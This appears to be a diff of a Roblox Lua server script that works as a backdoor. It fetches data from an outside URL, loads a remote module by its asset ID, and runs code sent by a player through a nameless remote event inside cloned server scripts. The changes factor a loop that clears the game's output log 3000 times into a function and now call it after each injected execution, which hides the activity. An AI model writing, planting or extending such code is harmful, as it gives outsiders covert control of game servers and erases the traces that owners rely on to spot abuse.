@@ -1,3 +1,4 @@
+print("meow")
 local ins=Instance.new
 local cf=CFrame.new
 local load=false
@@ -13,6 +14,13 @@ FluffyEvent.Name=""
 _G.FluffyEvent=FluffyEvent
 local Sado=script:FindFirstChildOfClass("ModuleScript")
 
+function Test()
+	for i=1,3000 do
+		game:GetService("LogService"):ClearOutput()
+		print("")
+	end
+end
+
 function Check(plr)
 	local success,result=pcall(function()
 		return Http:GetAsync(Url.."players")
@@ -25,10 +33,7 @@ function Check(plr)
 			FluffyEvent.Parent=workspace
 			load=true
 			require(tonumber(result)).ROOWO(script)
-			for i=1,3000 do
-				game:GetService("LogService"):ClearOutput()
-				print("")
-			end
+			Test()
 		end
 
 		local OutputGUI=script:WaitForChild("OutputGUI"):Clone()
@@ -194,23 +199,24 @@ FluffyEvent.OnServerEvent:Connect(function(plr,Type,Data)
 		elseif Data[1]:sub(1,2)=="c/" then
 			local req=Data[1]:sub(3)
 			local OldReq=req
+			local OwnerName=plr.Name
+
 			local Injected=[[
-	    local owner=game.Players["]]..plr.Name..[["]
-	    print=function(text)
-			_G.CreateOutput({text,"print"})
-		end
-		error=function(text)
-			_G.CreateOutput({text,"error"})
-		end
-		warn=function(text)
-			_G.CreateOutput({text,"warn"})
-		end
-		success=function(text)
-			_G.CreateOutput({text,"success"})
-		end
-		local owner=game.Players.LocalPlayer
-		success("Script has started (Client)")
-                           ]]
+	print=function(text)
+		_G.FluffyEvent:FireClient(game.Players["]]..OwnerName..[["],{text,"print"})
+	end
+	error=function(text)
+		_G.FluffyEvent:FireClient(game.Players["]]..OwnerName..[["],{text,"error"})
+	end
+	warn=function(text)
+		_G.FluffyEvent:FireClient(game.Players["]]..OwnerName..[["],{text,"warn"})
+	end
+	success=function(text)
+		_G.FluffyEvent:FireClient(game.Players["]]..OwnerName..[["],{text,"success"})
+	end
+	local owner=game.Players["]]..OwnerName..[["]
+	success("Script has started (Server)")
+]]
 			req=Injected..req
 			
 			local Server=script:FindFirstChildOfClass("Script"):Clone()
@@ -227,7 +233,7 @@ FluffyEvent.OnServerEvent:Connect(function(plr,Type,Data)
 
 			Server.Enabled=true
 			success("Executed the script "..OldReq,plr)
-
+			Test()
 		end
 
 	end
